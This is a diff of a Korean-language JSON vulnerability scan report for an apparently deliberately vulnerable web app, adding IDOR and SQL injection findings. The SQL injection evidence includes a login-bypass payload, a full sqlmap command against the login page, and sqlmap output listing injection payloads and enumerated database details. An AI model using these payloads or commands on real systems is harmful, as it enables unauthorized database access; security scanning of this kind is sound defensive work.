@@ -1,13 +1,13 @@
 {
-  "scan_id": "SCAN-20260515-022911",
+  "scan_id": "SCAN-20260515-050718",
   "target": "http://15.164.60.79",
   "scanner": "signature-based",
-  "generated_at": "2026-05-15T02:29:11Z",
+  "generated_at": "2026-05-15T14:07:18+09:00",
   "summary": {
-    "total": 8,
+    "total": 9,
     "severity": {
       "critical": 0,
-      "high": 0,
+      "high": 1,
       "medium": 6,
       "low": 2
     }
@@ -18,69 +18,109 @@
       "check_id": "WEB-A01-001",
       "owasp": "A01:2025 Broken Access Control",
       "name": "관리자 페이지 직접 접근",
+      "url": "",
       "severity": "medium",
       "evidence": "/vulnapp/admin.jsp 접근 가능, status=200",
       "recommendation": "관리자 페이지에 인증 및 권한 검증 적용"
     },
     {
       "id": "RES-0002",
+      "check_id": "WEB-A01-002",
+      "owasp": "A01:2025 Broken Access Control",
+      "name": "IDOR로 타 사용자 정보 조회",
+      "url": "",
+      "severity": "medium",
+      "evidence": "user_idx 파라미터 변경으로 다른 사용자 정보 응답 확인",
+      "recommendation": "서버 측에서 요청 사용자와 자원 소유자 권한 검증"
+    },
+    {
+      "id": "RES-0003",
       "check_id": "WEB-A02-001",
       "owasp": "A02:2025 Security Misconfiguration",
       "name": "보안 헤더 미설정",
+      "url": "",
       "severity": "low",
       "evidence": "CSP unsafe-inline 허용",
       "recommendation": "필수 보안 헤더 적용 및 CSP nonce/hash 기반 설정"
     },
     {
-      "id": "RES-0003",
+      "id": "RES-0004",
       "check_id": "WEB-A02-002",
       "owasp": "A02:2025 Security Misconfiguration",
       "name": "서버 버전 노출",
+      "url": "",
       "severity": "low",
       "evidence": "headers={'Server': 'nginx/1.28.3 (Ubuntu)'}, body_keywords=['Apache Tomcat/']",
       "recommendation": "서버 배너 제거 및 커스텀 에러 페이지 적용"
     },
     {
-      "id": "RES-0004",
+      "id": "RES-0005",
       "check_id": "WEB-A04-001",
       "owasp": "A04:2025 Cryptographic Failures",
       "name": "HTTPS 미적용",
+      "url": "",
       "severity": "medium",
       "evidence": "HTTP 프로토콜 사용",
       "recommendation": "HTTPS 적용 및 HTTP to HTTPS 리다이렉트 설정"
     },
     {
-      "id": "RES-0005",
-      "check_id": "WEB-A05-002",
+      "id": "RES-0006",
+      "check_id": "WEB-A05-001",
       "owasp": "A05:2025 Injection",
-      "name": "Reflected XSS",
-      "severity": "medium",
-      "evidence": "검색 파라미터 q에 입력한 script 태그가 응답에 그대로 반영됨",
-      "recommendation": "출력 시 HTML Encoding 적용"
+      "name": "SQL Injection",
+      "url": "",
+      "severity": "high",
+      "evidence": {
+        "payload": "' OR '1'='1",
+        "error_based": false,
+        "auth_bypass": true,
+        "redirected": true,
+        "redirect_location": "http://15.164.60.79/vulnapp/profile.jsp?user_idx=1",
+        "login_failed_absent": true,
+        "time_based": false,
+        "delay": 0.01,
+        "sqlmap": {
+          "command": "sqlmap -u http://15.164.60.79/vulnapp/login.jsp?id=test&pw=test --batch --level 2 --risk 1 --banner --current-user --current-db --is-dba --dbs",
+          "returncode": 0,
+          "dbms_banner": "11.8.6-MariaDB-5 from Ubuntu",
+          "current_user": "vulnuser@localhost",
+          "current_db": "vuln_db",
+          "is_dba": false,
+          "databases": [
+            "information_schema",
+            "vuln_db"
+          ],
+          "raw_tail": "ession:\n---\nParameter: id (GET)\n    Type: boolean-based blind\n    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)\n    Payload: id=test' AND 3587=(SELECT (CASE WHEN (3587=3587) THEN 3587 ELSE (SELECT 3534 UNION SELECT 5994) END))-- -&pw=test\n\n    Type: error-based\n    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)\n    Payload: id=test' AND EXTRACTVALUE(2234,CONCAT(0x5c,0x716b717a71,(SELECT (ELT(2234=2234,1))),0x717a626a71)) AND 'edVi'='edVi&pw=test\n\n    Type: time-based blind\n    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)\n    Payload: id=test' AND (SELECT 5860 FROM (SELECT(SLEEP(5)))GPqH) AND 'pohI'='pohI&pw=test\n\n    Type: UNION query\n    Title: Generic UNION query (NULL) - 4 columns\n    Payload: id=test' UNION ALL SELECT NULL,CONCAT(0x716b717a71,0x76665453756b5745796154454e73714754796b70764e54796b7853696b747175616c69635351797a,0x717a626a71),NULL,NULL-- -&pw=test\n---\n[05:07:18] [INFO] the back-end DBMS is MySQL\n[05:07:18] [INFO] fetching banner\nweb server operating system: Linux Ubuntu\nweb application technology: JSP, Django, Nginx 1.28.3\nback-end DBMS operating system: Linux Ubuntu\nback-end DBMS: MySQL >= 5.1 (MariaDB fork)\nbanner: '11.8.6-MariaDB-5 from Ubuntu'\n[05:07:18] [INFO] fetching current user\ncurrent user: 'vulnuser@localhost'\n[05:07:18] [INFO] fetching current database\ncurrent database: 'vuln_db'\n[05:07:18] [INFO] testing if current user is DBA\n[05:07:18] [INFO] fetching current user\n[05:07:18] [WARNING] potential permission problems detected ('command denied')\n[05:07:18] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'\ncurrent user is DBA: False\n[05:07:18] [INFO] fetching database names\navailable databases [2]:\n[*] information_schema\n[*] vuln_db\n\n[05:07:18] [INFO] fetched data logged to text files under '/home/ubuntu/.local/share/sqlmap/output/15.164.60.79'\n\n[*] ending @ 05:07:18 /2026-05-15/\n\n\n"
+        }
+      },
+      "recommendation": "Prepared Statement 사용 및 입력값 검증"
     },
     {
-      "id": "RES-0006",
+      "id": "RES-0007",
       "check_id": "WEB-A06-001",
       "owasp": "A06:2025 Insecure Design",
       "name": "로그인 Rate Limit 미구현",
+      "url": "",
       "severity": "medium",
       "evidence": "반복 로그인 실패 요청이 차단되지 않음",
       "recommendation": "로그인 실패 횟수 제한 및 지연 응답 적용"
     },
     {
-      "id": "RES-0007",
+      "id": "RES-0008",
       "check_id": "WEB-A06-002",
       "owasp": "A06:2025 Insecure Design",
       "name": "debug=true 기능 활성화",
+      "url": "",
       "severity": "medium",
       "evidence": "debug=true 요청 시 내부 설정 또는 디버그 정보 노출",
       "recommendation": "운영 환경에서 debug 기능 비활성화"
     },
     {
-      "id": "RES-0008",
+      "id": "RES-0009",
       "check_id": "WEB-A07-001",
       "owasp": "A07:2025 Authentication Failures",
       "name": "계정 잠금 미구현",
+      "url": "",
       "severity": "medium",
       "evidence": "10회 이상 로그인 실패 후에도 계정 잠금 또는 차단 응답 없음",
       "recommendation": "계정 잠금, 지연 응답, CAPTCHA 적용"
